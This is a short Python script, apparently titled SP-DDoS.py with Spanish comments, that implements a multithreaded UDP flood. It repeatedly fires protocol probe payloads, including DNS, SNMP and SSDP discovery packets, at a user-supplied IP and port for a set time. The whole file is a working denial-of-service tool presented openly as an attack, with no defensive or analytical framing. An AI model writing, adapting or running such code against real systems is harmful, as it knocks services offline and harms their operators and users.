import socket
import threading
import time
import sys

def usage():
    print("Usage: python3 SP-DDoS.py <ip> <port> <time> <threads>")
    sys.exit()

def attack(ip, port, duration):
    """Función que envía los payloads al objetivo"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payloads = [
        b"\xd9\x00", b"\x00\x00", b"\x00\x00", b"\x00\x00", b"\x00\x00",
        b"\x00\x00", b"\xd9\x00\x00", b"\xd9\x00\x00", b"\xd9\x00\x00",
        b"\xd9\x00\x00", b"\xd9\x00\x00", b"\xd9\x00\x00", b"\x72\xfe\x1d\x13\x00\x00",
        b"\x72\xfe\x1d\x13\x00\x00", b"\x72\xfe\x1d\x13\x00\x00", b"\x72\xfe\x1d\x13\x00\x00",
        b"\x72\xfe\x1d\x13\x00\x00", b"\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00",
        b"\x02\x00\x00", b"\x0d\x0a\x0d\x0a\x00\x00", b"\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00",
        b"\x72\xfe\x1d\x13\x00\x00", b"\x38\x64\xc1\x78\x01\xb8\x9b\xcb\x8f\x00\x00",
        b"\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00",
        b"\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00", b"\x01\x00\x00",
        b"\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00",
        b"\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x4f\x53\x54\x3a\x20\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x3a\x31\x39\x30\x30\x0d\x0a\x4d\x41\x4e\x3a\x20\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x20\x31\x0d\x0a\x53\x54\x3a\x20\x75\x72\x6e\x3a\x64\x69\x61\x6c\x2d\x6d\x75\x6c\x74\x69\x73\x63\x72\x65\x65\x6e\x2d\x6f\x72\x67\x3a\x73\x65\x72\x76\x69\x63\x65\x3a\x64\x69\x61\x6c\x3a\x31\x0d\x0a\x55\x53\x45\x52\x2d\x41\x47\x45\x4e\x54\x3a\x20\x47\x6f\x6f\x67\x6c\x65\x20\x43\x68\x72\x6f\x6d\x65\x2f\x36\x30\x2e\x30\x2e\x33\x31\x31\x32\x2e\x39\x30\x20\x57\x69\x6e\x64\x6f\x77\x73\x0d\x0a\x0d\x0a\x00\x00",
        b"\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00", b"\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00",
        b"\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00"
    ]
    end_time = time.time() + duration

    while time.time() < end_time:
        for payload in payloads:
            try:
                sock.sendto(payload, (ip, port))
            except Exception as e:
                print(f"Error: {e}")
                sock.close()
                return
    sock.close()

def main():
    if len(sys.argv) != 5:
        usage()

    ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    threads = int(sys.argv[4])

    print(f"Starting attack on {ip}:{port} for {duration} seconds with {threads} threads.")
    for _ in range(threads):
        thread = threading.Thread(target=attack, args=(ip, port, duration))
        thread.start()

if __name__ == "__main__":
    main()